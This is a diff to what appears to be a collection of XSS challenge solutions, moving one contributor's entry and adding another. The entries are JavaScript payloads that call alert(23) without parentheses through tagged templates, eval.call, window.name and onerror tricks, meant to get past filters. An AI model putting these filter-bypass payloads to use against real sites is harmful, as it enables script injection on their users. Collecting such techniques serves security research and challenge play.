@@ -15,23 +15,19 @@ xss.html
 
 ---
 
-[terjanq](https://twitter.com/terjanq)
-
-    window.name="alert(23)";
-    location="xss.html";
-xss.html
-
-    Function`a${name}```
-
-
----
-
 [Cure53](https://github.com/cure53/XSSChallengeWiki/wiki/prompt.ml#level-2)
 
 
     eval.call`${'alert\x2823\x29'}`
 
 
+---
+
+[Renwa](https://twitter.com/RenwaX23)
+
+
+    eval.apply`${[`alert\x2823\x29`]}`
+    
 ---
 
 [Garethheyes](http://www.thespanner.co.uk/2012/05/01/xss-technique-without-parentheses/)
@@ -71,7 +67,17 @@ xss_short.html
 [terjanq](https://twitter.com/terjanq/status/1126796552960389120)
 
     throw/a/,Uncaught=1,g=alert,a=g+0,onerror=eval,/1/g+a[14]+[23,331,337]+a[15]
+    
+---
 
+[terjanq](https://twitter.com/terjanq)
+
+    window.name="alert(23)";
+    location="xss.html";
+xss.html
+
+    Function`a${name}```
+    
 ---
 Only Firefox [Garethheyes](https://twitter.com/garethheyes/status/1126922526796468224)
           
